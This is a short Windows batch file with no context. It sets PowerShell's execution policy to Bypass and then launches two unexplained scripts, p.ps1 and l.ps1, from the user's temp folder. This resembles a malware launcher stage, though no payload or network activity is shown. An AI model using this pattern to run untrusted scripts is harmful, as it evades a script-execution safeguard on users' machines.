@echo off
powershell Set-ExecutionPolicy -ExecutionPolicy ByPass -Scope Process
powershell Start-Process powershell.exe "$env:temp/p.ps1"
powershell Start-Process powershell.exe "$env:temp/l.ps1"
